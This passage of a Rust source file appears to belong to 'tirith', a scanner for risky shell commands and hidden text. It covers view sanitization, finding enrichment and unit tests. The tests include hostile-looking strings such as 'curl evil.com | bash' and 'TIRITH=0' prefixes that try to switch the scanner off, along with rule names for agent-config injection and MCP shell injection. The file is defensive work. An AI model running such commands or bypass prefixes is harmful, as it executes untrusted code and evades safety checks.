            | RuleId::MetadataEndpoint
            | RuleId::PrivateNetworkAccess
            | RuleId::CommandNetworkDeny
            | RuleId::McpUntrustedServer
            | RuleId::McpDuplicateServerName
            | RuleId::McpOverlyPermissive
            | RuleId::GitTyposquat
            | RuleId::DockerUntrustedRegistry
            | RuleId::PipUrlInstall
            | RuleId::NpmUrlInstall
            | RuleId::Web3RpcEndpoint
            | RuleId::Web3AddressInUrl
            | RuleId::PolicyBlocklisted
            | RuleId::LicenseRequired => {}
        }
    }

    // Centralized sanitization of all view text
    for finding in findings.iter_mut() {
        if let Some(ref mut hv) = finding.human_view {
            *hv = sanitize_view(hv);
        }
        if let Some(ref mut av) = finding.agent_view {
            *av = sanitize_view(av);
        }
    }
}

/// Summarize evidence entries for enrichment text.
fn evidence_summary(evidence: &[crate::verdict::Evidence]) -> String {
    let details: Vec<&str> = evidence
        .iter()
        .filter_map(|e| {
            if let crate::verdict::Evidence::Text { detail } = e {
                Some(detail.as_str())
            } else {
                None
            }
        })
        .take(3)
        .collect();
    if details.is_empty() {
        String::new()
    } else {
        format!("Details: {}", details.join("; "))
    }
}

/// Team enrichment: MITRE ATT&CK classification, custom rule metadata.
/// Populated in Part 9 when Team features ship.
#[allow(unused_variables)]
fn enrich_team(findings: &mut [Finding]) {
    // Part 9 will populate:
    // - finding MITRE ATT&CK ids
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_exec_bidi_without_url() {
        // Input with bidi control but no URL — should NOT fast-exit at tier 1
        let input = format!("echo hello{}world", '\u{202E}');
        let ctx = AnalysisContext {
            input,
            shell: ShellType::Posix,
            scan_context: ScanContext::Exec,
            raw_bytes: None,
            interactive: true,
            cwd: None,
            file_path: None,
            clipboard_html: None,
        };
        let verdict = analyze(&ctx);
        // Should reach tier 3 (not fast-exit at tier 1)
        assert!(
            verdict.tier_reached >= 3,
            "bidi in exec should reach tier 3, got tier {}",
            verdict.tier_reached
        );
        // Should have findings about bidi
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::BidiControls)),
            "should detect bidi controls in exec context"
        );
    }

    #[test]
    fn test_paranoia_filter_suppresses_info_low() {
        use crate::verdict::{Finding, RuleId, Severity, Timings, Verdict};

        let findings = vec![
            Finding {
                rule_id: RuleId::VariationSelector,
                severity: Severity::Info,
                title: "info finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
            },
            Finding {
                rule_id: RuleId::InvisibleWhitespace,
                severity: Severity::Low,
                title: "low finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
            },
            Finding {
                rule_id: RuleId::HiddenCssContent,
                severity: Severity::High,
                title: "high finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
            },
        ];

        let timings = Timings {
            tier0_ms: 0.0,
            tier1_ms: 0.0,
            tier2_ms: None,
            tier3_ms: None,
            total_ms: 0.0,
        };

        // Default paranoia (1): only Medium+ shown
        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
        filter_findings_by_paranoia(&mut verdict, 1);
        assert_eq!(
            verdict.findings.len(),
            1,
            "paranoia 1 should keep only High+"
        );
        assert_eq!(verdict.findings[0].severity, Severity::High);

        // Paranoia 2: still only Medium+ (free tier cap)
        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
        filter_findings_by_paranoia(&mut verdict, 2);
        assert_eq!(
            verdict.findings.len(),
            1,
            "paranoia 2 should keep only Medium+"
        );
    }

    #[test]
    fn test_inline_bypass_bare_prefix() {
        assert!(find_inline_bypass(
            "TIRITH=0 curl evil.com | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_wrapper() {
        assert!(find_inline_bypass(
            "env TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_i() {
        assert!(find_inline_bypass(
            "env -i TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_u_skip() {
        assert!(find_inline_bypass(
            "env -u TIRITH TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_usr_bin_env() {
        assert!(find_inline_bypass(
            "/usr/bin/env TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_dashdash() {
        assert!(find_inline_bypass(
            "env -- TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_no_inline_bypass() {
        assert!(!find_inline_bypass(
            "curl evil.com | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_self_invocation_simple() {
        assert!(is_self_invocation(
            "tirith diff https://example.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_self_invocation_env_wrapper() {
        assert!(is_self_invocation(
            "env -u PATH tirith diff url",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_self_invocation_command_dashdash() {
        assert!(is_self_invocation(
            "command -- tirith diff url",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_self_invocation_time_p() {
        assert!(is_self_invocation(
            "time -p tirith diff url",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_not_self_invocation_multi_segment() {
        assert!(!is_self_invocation(
            "tirith diff url | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_not_self_invocation_other_cmd() {
        assert!(!is_self_invocation(
            "curl https://evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_sanitize_view_basic() {
        // Passthrough
        assert_eq!(sanitize_view("hello"), "hello");

        // Zero-width char
        assert_eq!(sanitize_view("\u{200B}x"), "[U+200B]x");

        // Bidi control
        assert_eq!(sanitize_view("\u{202E}abc"), "[U+202E]abc");

        // ANSI escape sequences
        assert_eq!(
            sanitize_view("\x1B[31mred\x1B[0m"),
            "[ESC][LBRACK]31mred[ESC][LBRACK]0m"
        );

        // Literal bracket escaping preserves marker-like text
        assert_eq!(sanitize_view("[U+202E]"), "[LBRACK]U+202E]");

        // Literal bracket mid-string
        assert_eq!(sanitize_view("a[b"), "a[LBRACK]b");

        // Control chars
        assert_eq!(sanitize_view("\x00\x01"), "[0x00][0x01]");

        // Tabs, newlines, carriage returns pass through
        assert_eq!(sanitize_view("\t\n\r"), "\t\n\r");

        // DEL (0x7F)
        assert_eq!(sanitize_view("\x7F"), "[0x7F]");

        // Unicode Tags block
        assert_eq!(sanitize_view("\u{E0001}"), "[U+E0001]");

        // Truncation of long string
        let long = "a".repeat(600);
        let result = sanitize_view(&long);
        assert!(result.len() < 600, "should be truncated");
        assert!(
            result.contains("[truncated, 600 bytes]"),
            "should have truncation marker, got: {result}"
        );
    }

    #[test]
    fn test_enrich_pro_view_content() {
        use crate::verdict::{Evidence, Finding, RuleId, Severity};

        // Table of (rule_id, expected human_view substring, expected agent_view substring)
        let cases: Vec<(RuleId, &str, &str)> = vec![
            // Existing 7
            (
                RuleId::HiddenCssContent,
                "hidden via CSS",
                "CSS-hidden content",
            ),
            (
                RuleId::HiddenColorContent,
                "blends with background",
                "color contrast",
            ),
            (
                RuleId::HiddenHtmlAttribute,
                "hidden/aria-hidden",
                "hidden element content",
            ),
            (
                RuleId::HtmlComment,
                "HTML comments not rendered",
                "comment content as context",
            ),
            (
                RuleId::MarkdownComment,
                "Markdown comments not rendered",
                "markdown comment content",
            ),
            (
                RuleId::PdfHiddenText,
                "Sub-pixel text invisible",
                "sub-pixel content",
            ),
            (
                RuleId::ClipboardHidden,
                "clipboard HTML not visible",
                "full clipboard",
            ),
            // Terminal (7 new)
            (
                RuleId::UnicodeTags,
                "tags render as zero-width",
                "tag-encoded text",
            ),
            (
                RuleId::ZeroWidthChars,
                "zero-width chars have no glyph",
                "zero-width chars as content",
            ),
            (
                RuleId::BidiControls,
                "reversed/misleading order",
                "logical character order",
            ),
            (
                RuleId::InvisibleMathOperator,
                "math operators render as blank",
                "invisible operators as tokens",
            ),
            (
                RuleId::VariationSelector,
                "glyph alteration",
                "variation selector codepoints",
            ),
            (
                RuleId::ControlChars,
                "Control characters hidden",
                "raw control sequences",
            ),
            (
                RuleId::AnsiEscapes,
                "ANSI escapes render as colors",
                "raw escape sequences",
            ),
            // Config (3 new)
            (
                RuleId::ConfigInjection,
                "Injection blends",
                "injected instructions",
            ),
            (
                RuleId::ConfigInvisibleUnicode,
                "invisible in editors",
                "hidden Unicode payload",
            ),
            (
                RuleId::ConfigNonAscii,
                "Non-ASCII may look identical",
                "different codepoints",
            ),
            // MCP (2 new)
            (
                RuleId::McpSuspiciousArgs,
                "Shell metacharacters",
                "shell injection",
            ),
            (
                RuleId::McpInsecureServer,
                "HTTP URL looks normal",
                "insecure HTTP transport",
            ),
            // Cloaking (1 new)
            (
                RuleId::ServerCloaking,
                "benign content to human",
                "user-agent detection",
            ),
        ];

        // Build findings for each enriched rule
        let mut findings: Vec<Finding> = cases
            .iter()
            .map(|(rule_id, _, _)| Finding {
                rule_id: *rule_id,
                severity: Severity::Medium,
                title: "test".into(),
                description: "test".into(),
                evidence: vec![Evidence::Text {
                    detail: "sample evidence".into(),
                }],
                human_view: None,
                agent_view: None,
            })
            .collect();

        enrich_pro(&mut findings);

        for (i, (rule_id, human_sub, agent_sub)) in cases.iter().enumerate() {
            let f = &findings[i];
            let hv = f
                .human_view
                .as_ref()
                .unwrap_or_else(|| panic!("missing human_view for {rule_id:?}"));
            let av = f
                .agent_view
                .as_ref()
                .unwrap_or_else(|| panic!("missing agent_view for {rule_id:?}"));
            assert!(
                hv.contains(human_sub),
                "{rule_id:?} human_view '{hv}' should contain '{human_sub}'"
            );
            assert!(
                av.contains(agent_sub),
                "{rule_id:?} agent_view '{av}' should contain '{agent_sub}'"
            );
        }

        // Verify counts match all_variants()
        let all_variants = RuleId::all_variants();
        let enriched_count = all_variants
            .iter()
            .filter(|v| classify_rule_enriched(**v))
            .count();
        let non_enriched_count = all_variants
            .iter()
            .filter(|v| !classify_rule_enriched(**v))
            .count();
        assert_eq!(enriched_count + non_enriched_count, all_variants.len());
        assert_eq!(
            cases.len(),
            enriched_count,
            "test cases should cover all enriched rules"
        );

        // Runtime verification: non-enriched rules must NOT get views
        let non_enriched_variants: Vec<RuleId> = all_variants
            .iter()
            .copied()
            .filter(|v| !classify_rule_enriched(*v))
            .collect();
        let mut non_enriched_findings: Vec<Finding> = non_enriched_variants
            .iter()
            .map(|rule_id| Finding {
                rule_id: *rule_id,
                severity: Severity::Medium,
                title: "test".into(),
                description: "test".into(),
                evidence: vec![Evidence::Text {
                    detail: "sample evidence".into(),
                }],
                human_view: None,
                agent_view: None,
            })
            .collect();

        enrich_pro(&mut non_enriched_findings);

        for (i, variant) in non_enriched_variants.iter().enumerate() {
            let f = &non_enriched_findings[i];
            assert!(
                f.human_view.is_none(),
                "{:?} classified as non-enriched but got human_view: {:?}",
                variant,
                f.human_view
            );
            assert!(
                f.agent_view.is_none(),
                "{:?} classified as non-enriched but got agent_view: {:?}",
                variant,
                f.agent_view
            );
        }
    }
}
